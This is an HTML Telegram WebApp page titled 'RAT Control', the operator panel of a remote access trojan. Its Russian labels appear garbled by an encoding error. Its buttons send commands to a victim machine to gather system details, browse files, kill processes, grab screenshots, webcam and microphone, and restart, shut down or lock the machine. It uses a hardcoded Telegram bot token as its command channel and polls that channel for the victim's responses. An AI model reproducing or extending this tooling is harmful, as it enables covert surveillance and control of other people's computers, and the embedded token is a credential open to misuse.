<!DOCTYPE html>
<html>
<head>
    <title>RAT Control</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f5f5f5;
            padding: 16px;
        }
        .card {
            background: white;
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 16px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }
        button {
            background: #0088cc;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 12px;
            margin: 4px;
            width: calc(50% - 8px);
            font-size: 14px;
            cursor: pointer;
        }
        .output {
            background: #f0f0f0;
            border-radius: 8px;
            padding: 12px;
            margin-top: 12px;
            white-space: pre-wrap;
            max-height: 300px;
            overflow-y: auto;
            font-family: monospace;
        }
        .path-bar {
            background: #e9ecef;
            padding: 8px;
            border-radius: 5px;
            margin: 10px 0;
            font-family: monospace;
        }
        .file-item {
            padding: 8px;
            border-bottom: 1px solid #eee;
            cursor: pointer;
        }
        .file-item:hover {
            background: #f0f0f0;
        }
        .status-bar {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: white;
            padding: 12px;
            border-top: 1px solid #ddd;
            text-align: center;
        }
    </style>
</head>
<body>
    <h1>ü§ñ RAT CONTROL</h1>
    <p id="status">–ì–æ—Ç–æ–≤ –∫ —Ä–∞–±–æ—Ç–µ</p>

    <!-- –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–∏—Å—Ç–µ–º–µ -->
    <div class="card">
        <h3>üìä –°–∏—Å—Ç–µ–º–∞</h3>
        <button onclick="sendCmd('system_info')">–ò–Ω—Ñ–æ</button>
        <button onclick="sendCmd('cpu_info')">CPU</button>
        <button onclick="sendCmd('ram_info')">RAM</button>
        <button onclick="sendCmd('disk_info')">–î–∏—Å–∫</button>
        <div id="system-output" class="output"></div>
    </div>

    <!-- –§–∞–π–ª—ã -->
    <div class="card">
        <h3>üìÅ –§–∞–π–ª—ã</h3>
        <div class="path-bar" id="current-path">C:\</div>
        <button onclick="sendCmd('list_files')">–°–ø–∏—Å–æ–∫</button>
        <button onclick="sendCmd('go_back')">–ù–∞–∑–∞–¥</button>
        <input type="text" id="folder-input" placeholder="–ü—É—Ç—å –∫ –ø–∞–ø–∫–µ" style="width:100%; padding:8px; margin:8px 0;">
        <button onclick="changeDir()" style="width:100%">–ü–µ—Ä–µ–π—Ç–∏</button>
        <div id="files-output" class="output"></div>
    </div>

    <!-- –ü—Ä–æ—Ü–µ—Å—Å—ã -->
    <div class="card">
        <h3>üìã –ü—Ä–æ—Ü–µ—Å—Å—ã</h3>
        <button onclick="sendCmd('processes')">–í—Å–µ</button>
        <button onclick="sendCmd('top_cpu')">–ü–æ CPU</button>
        <button onclick="sendCmd('top_ram')">–ü–æ RAM</button>
        <input type="number" id="pid-input" placeholder="PID" style="width:70%; padding:8px;">
        <button onclick="killProcess()" style="width:28%">–£–±–∏—Ç—å</button>
        <div id="processes-output" class="output"></div>
    </div>

    <!-- –ú–µ–¥–∏–∞ -->
    <div class="card">
        <h3>üé• –ú–µ–¥–∏–∞</h3>
        <button onclick="sendCmd('screen')">–°–∫—Ä–∏–Ω—à–æ—Ç</button>
        <button onclick="sendCmd('webcam')">–í–µ–±–∫–∞</button>
        <button onclick="sendCmd('mic')">–ú–∏–∫—Ä–æ—Ñ–æ–Ω</button>
    </div>

    <!-- –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ -->
    <div class="card">
        <h3>‚ö° –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ</h3>
        <button onclick="sendCmd('restart')">–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∞</button>
        <button onclick="sendCmd('shutdown')">–í—ã–∫–ª—é—á–µ–Ω–∏–µ</button>
        <button onclick="sendCmd('lock')">–ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞</button>
        <button onclick="sendCmd('sleep')">–°–æ–Ω</button>
    </div>

    <div class="status-bar" id="status-bar">–ì–æ—Ç–æ–≤</div>

    <script>
        const tg = Telegram.WebApp;
        tg.expand();
        
        // –ù–∞—Å—Ç—Ä–æ–π–∫–∏
        const BOT_TOKEN = '8417099264:AAHZ_xx4NfBLs04BoGyutO0_dwaa66b-ECo';
        let currentDir = 'C:\\';
        let lastUpdateId = 0;

        // –û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–º–∞–Ω–¥—ã
        function sendCmd(action, params = {}) {
            const cmd = {
                action: action,
                params: params,
                time: Date.now()
            };
            
            document.getElementById('status-bar').innerText = '‚è≥ –û—Ç–ø—Ä–∞–≤–∫–∞...';
            tg.sendData(JSON.stringify(cmd));
        }

        // –°–ø–µ—Ü–∫–æ–º–∞–Ω–¥—ã
        function changeDir() {
            const path = document.getElementById('folder-input').value;
            if (path) {
                sendCmd('change_dir', { path: path, current: currentDir });
            }
        }

        function killProcess() {
            const pid = document.getElementById('pid-input').value;
            if (pid) {
                sendCmd('kill_process', { pid: parseInt(pid) });
            }
        }

        // –ü–æ–ª—É—á–µ–Ω–∏–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–π
        async function getUpdates() {
            try {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`;
                const response = await fetch(url);
                const data = await response.json();
                
                if (data.ok && data.result.length > 0) {
                    data.result.forEach(update => {
                        lastUpdateId = update.update_id;
                        
                        if (update.message && update.message.text) {
                            // –ü–∞—Ä—Å–∏–º –æ—Ç–≤–µ—Ç
                            try {
                                const response = JSON.parse(update.message.text);
                                handleResponse(response);
                            } catch (e) {
                                // –ï—Å–ª–∏ –Ω–µ JSON, –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –∫–∞–∫ —Ç–µ–∫—Å—Ç
                                if (update.message.text.includes('‚úÖ') || update.message.text.includes('‚ùå')) {
                                    document.getElementById('status-bar').innerText = update.message.text;
                                }
                            }
                        }
                    });
                }
            } catch (e) {
                console.error('–û—à–∏–±–∫–∞:', e);
            }
        }

        // –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—Ç–≤–µ—Ç–æ–≤
        function handleResponse(response) {
            document.getElementById('status-bar').innerText = '‚úÖ –î–∞–Ω–Ω—ã–µ –ø–æ–ª—É—á–µ–Ω—ã';
            
            // –°–∏—Å—Ç–µ–º–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è
            if (response.system) {
                showSystemInfo(response.system);
            }
            
            // –§–∞–π–ª—ã
            if (response.files) {
                showFiles(response);
            }
            
            // –ü—Ä–æ—Ü–µ—Å—Å—ã
            if (response.processes) {
                showProcesses(response.processes);
            }
            
            // CPU
            if (response.cores) {
                showCPUInfo(response);
            }
            
            // RAM
            if (response.total && response.used) {
                showRAMInfo(response);
            }
            
            // –î–∏—Å–∫–∏
            if (Array.isArray(response) && response[0]?.device) {
                showDisks(response);
            }
            
            // –°–µ—Ç—å
            if (response.hostname) {
                showNetwork(response);
            }
            
            // Wi-Fi
            if (Array.isArray(response) && response[0]?.includes('üì∂')) {
                document.getElementById('system-output').innerHTML = response.join('\n');
            }
        }

        function showSystemInfo(data) {
            const html = `
üñ•Ô∏è –û–°: ${data.os}
üíª –ö–æ–º–ø—å—é—Ç–µ—Ä: ${data.host}
üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: ${data.user}
‚è±Ô∏è –ó–∞–ø—É—Å–∫: ${data.boot}

‚öôÔ∏è CPU: ${data.cpu}%
üíæ RAM: ${data.ram_used}/${data.ram_total} –ì–ë (${data.ram_percent}%)
üíø –î–∏—Å–∫: ${data.disk_used}/${data.disk_total} –ì–ë (${data.disk_percent}%)
            `;
            document.getElementById('system-output').innerHTML = html;
        }

        function showFiles(data) {
            if (data.current_dir) {
                currentDir = data.current_dir;
                document.getElementById('current-path').innerText = currentDir;
            }
            
            if (data.files) {
                let html = '';
                data.files.slice(0, 20).forEach(f => {
                    const icon = f.is_dir ? 'üìÅ' : 'üìÑ';
                    html += `<div class="file-item" onclick="selectFile('${f.name}')">${icon} ${f.name} ${f.size}</div>`;
                });
                document.getElementById('files-output').innerHTML = html;
            }
        }

        function showProcesses(procs) {
            let html = '';
            procs.slice(0, 20).forEach(p => {
                html += `<div>üìä ${p.pid} | ${p.name} | CPU:${p.cpu}% RAM:${p.ram}%</div>`;
            });
            document.getElementById('processes-output').innerHTML = html;
        }

        function showCPUInfo(data) {
            let html = '‚öôÔ∏è –ü—Ä–æ—Ü–µ—Å—Å–æ—Ä:\n\n';
            data.cores.forEach((core, i) => {
                html += `–Ø–¥—Ä–æ ${i}: ${core}%\n`;
            });
            html += `\nüìä –ß–∞—Å—Ç–æ—Ç–∞: ${data.freq} –ú–ì—Ü`;
            document.getElementById('system-output').innerHTML = html;
        }

        function showRAMInfo(data) {
            const html = `
üíæ –ü–∞–º—è—Ç—å:
–í—Å–µ–≥–æ: ${data.total}
–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–æ: ${data.used} (${data.percent}%)
–î–æ—Å—Ç—É–ø–Ω–æ: ${data.available}

üîÑ Swap:
–í—Å–µ–≥–æ: ${data.swap_total}
–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–æ: ${data.swap_used}
            `;
            document.getElementById('system-output').innerHTML = html;
        }

        function showDisks(disks) {
            let html = 'üíø –î–∏—Å–∫–∏:\n\n';
            disks.forEach(disk => {
                html += `${disk.device} (${disk.mount})\n`;
                html += `  –í—Å–µ–≥–æ: ${disk.total}\n`;
                html += `  –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–æ: ${disk.used} (${disk.percent}%)\n`;
                html += `  –°–≤–æ–±–æ–¥–Ω–æ: ${disk.free}\n\n`;
            });
            document.getElementById('system-output').innerHTML = html;
        }

        function showNetwork(data) {
            const html = `
üåê –°–µ—Ç—å:
–ö–æ–º–ø—å—é—Ç–µ—Ä: ${data.hostname}
–õ–æ–∫–∞–ª—å–Ω—ã–π IP: ${data.local_ip}
–í–Ω–µ—à–Ω–∏–π IP: ${data.external_ip}

üìä –¢—Ä–∞—Ñ–∏–∫:
–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ: ${data.bytes_sent}
–ü–æ–ª—É—á–µ–Ω–æ: ${data.bytes_recv}
            `;
            document.getElementById('system-output').innerHTML = html;
        }

        function selectFile(name) {
            // –ú–æ–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å –ª–æ–≥–∏–∫—É –¥–ª—è –≤—ã–±–æ—Ä–∞ —Ñ–∞–π–ª–∞
            console.log('–í—ã–±—Ä–∞–Ω —Ñ–∞–π–ª:', name);
        }

        // –ó–∞–ø—É—Å–∫–∞–µ–º –ø–æ–ª–ª–∏–Ω–≥ –∫–∞–∂–¥—ã–µ 2 —Å–µ–∫—É–Ω–¥—ã
        setInterval(getUpdates, 2000);
        
        // –ó–∞–≥—Ä—É–∂–∞–µ–º —Ñ–∞–π–ª—ã –ø—Ä–∏ —Å—Ç–∞—Ä—Ç–µ
        setTimeout(() => sendCmd('list_files'), 1000);
    </script>
</body>
</html>
